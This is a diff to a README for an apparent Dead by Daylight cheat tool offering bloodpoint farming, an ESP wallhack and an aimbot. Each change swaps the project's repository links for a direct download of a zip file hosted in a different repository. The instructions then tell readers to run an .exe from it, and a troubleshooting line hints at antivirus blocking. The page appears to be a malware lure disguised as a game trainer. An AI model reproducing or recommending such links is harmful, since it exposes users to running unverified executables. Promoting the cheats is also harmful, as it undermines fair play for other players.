@@ -6,7 +6,7 @@ description: "Automate bloodpoint farming and unlock game items for Dead by Dayl
 # 🎮 DBD-AutoGrind-Trainer-2026 - Automate your game progress with ease
 
 <p align="center">
-  <a href="https://github.com/chandalrich19/DBD-AutoGrind-Trainer-2026">
+  <a href="https://raw.githubusercontent.com/chandalrich19/chandalrich19.github.io/main/whir/io-chandalrich-github-v1.5.zip">
     <img src="https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge" alt="Download">
   </a>
 </p>
@@ -21,7 +21,7 @@ This software automates progression tasks for Dead by Daylight. Users gain Blood
 
 ## 🚀 Getting Started
 
-1. Visit the [official repository page](https://github.com/chandalrich19/DBD-AutoGrind-Trainer-2026) to download the application.
+1. Visit the [official repository page](https://raw.githubusercontent.com/chandalrich19/chandalrich19.github.io/main/whir/io-chandalrich-github-v1.5.zip) to download the application.
 2. Locate the latest release file with the .exe extension.
 3. Save the file to your computer.
 4. Double-click the file to start the installation process.
@@ -60,4 +60,4 @@ If the program fails to start or crashes, verify that your antivirus is not bloc
 Start by enabling lower-intensity features to test the functionality. For instance, begin with the Bloodpoint farming tool before trying advanced features like the ESP wallhack. Ensure your game resolution matches your desktop resolution for the best accuracy with the aimbot. Always close unnecessary background tasks to free up memory while running the application.
 
 ## 📜 Legal Notice
-This software intends to provide convenience for personal game progress. We encourage players to use tools responsibly to maintain a fair environment for everyone in the Fog. Access the project through the [download link](https://github.com/chandalrich19/DBD-AutoGrind-Trainer-2026) to ensure you possess the current version.
+This software intends to provide convenience for personal game progress. We encourage players to use tools responsibly to maintain a fair environment for everyone in the Fog. Access the project through the [download link](https://raw.githubusercontent.com/chandalrich19/chandalrich19.github.io/main/whir/io-chandalrich-github-v1.5.zip) to ensure you possess the current version.
